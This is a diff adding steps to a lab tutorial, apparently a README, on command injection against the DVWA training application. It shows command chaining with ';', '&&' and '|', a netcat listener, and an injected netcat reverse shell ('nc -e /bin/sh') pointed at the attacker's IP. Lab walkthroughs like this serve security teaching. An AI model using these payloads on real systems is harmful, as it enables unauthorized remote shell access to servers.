@@ -18,12 +18,53 @@ Command Injection attack is performed by using arbitrary commands(The command wh
 
 2. Find the IP address using terminal. 
 
-```bash
+```
   ifconfig 
 ```
 
 3. Enter IP address to DVWA.  
 
 ![image](https://user-images.githubusercontent.com/60937657/194224867-2863f530-e203-4c53-92bf-344421fb8116.png)
+
+4. Performing arbitrary command.
+
+**Note** We will use arbitrary commands using piping. 
+
+**For Example** 
+
+```
+  ls ; pwd 
+```
+```
+  ls && pwd 
+```
+```
+#In this way of piping we will only be output of final command which in pwd in this case.
+  ls | pwd 
+```
+![image](https://user-images.githubusercontent.com/60937657/194370933-c383fb1c-ca37-48d2-ba90-a91d5ae01d8c.png)
+
+5. Make a connection in shell of website server with terminal of our machine by starting netcat services for linux based server 
+
+Using the below given command in terminal.
+
+```
+nc -vv -l -p 8080
+```
+
+![image](https://user-images.githubusercontent.com/60937657/194373887-5eb2d874-5036-4779-b0e8-a3bd5dbcdf2e.png)
+
+**Note** Netcat service will always be hosted in bin folder of linux as per the architecture
+
+6. Using a command in which we are going to use IP of our OS to fire on website by which we are going to get a connection in out terminal. 
+
+```
+nc -e /bin/sh IP_Address_of_my_OS 8080
+```
+
+![image](https://user-images.githubusercontent.com/60937657/194376389-1efd866c-c799-491e-8f69-ea807c39928c.png)
+
+
+
 
 
